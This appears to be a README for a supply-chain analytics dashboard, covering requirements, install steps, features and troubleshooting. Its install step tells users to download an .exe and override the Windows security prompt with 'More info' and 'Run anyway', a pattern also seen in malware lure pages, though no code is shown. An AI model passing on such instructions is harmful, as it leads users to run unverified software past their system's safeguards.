📊 About This Dashboard

The Nassau-Candy-Logistics-Analytics tool tracks how products move from the factory to the customer. It provides a visual way to view your supply chain data. Business owners use this information to find delays and save costs on shipping routes. The software turns complex spreadsheet data into simple charts and maps.

💻 System Requirements

Your computer needs to meet these basic standards to run the software:

  • Windows 10 or Windows 11 operating system.
  • A modern web browser like Google Chrome, Microsoft Edge, or Firefox.
  • At least 4GB of RAM.
  • An active internet connection to load the dashboard files initially.

📥 Installation Steps

Follow these directions to set up the dashboard on your Windows machine:

  1. Go to the official download page.
  2. Look for the latest version under the "Releases" section.
  3. Click the file ending in .exe to start the download.
  4. Once the download finishes, open the file from your "Downloads" folder.
  5. Windows might show a security prompt. If it does, click "More info" and then "Run anyway."
  6. The dashboard application will open in a new browser window automatically.

🛠 Using the Analytics Tools

The main screen shows your current shipping routes. Each section of the dashboard handles a specific part of your data:

  • Route Map: View the paths your products follow from the factory to the destination.
  • Efficiency Trends: See which routes take the longest time to complete.
  • Data Upload: You can load your own inventory reports using the file picker button.

Keep your data in a simple spreadsheet format for the best results. The system reads your files and updates the charts instantly.

❓ Troubleshooting

If you face issues, check these frequent solutions:

  • Dashboard won't open: Close all open browser windows and restart the application by clicking the icon again.
  • Slow performance: Refresh the page in your web browser. This clears the cache and forces the data to reload.
  • Missing data: Ensure your spreadsheet files have clear headers for columns like "Delivery Date" and "Shipping Route."
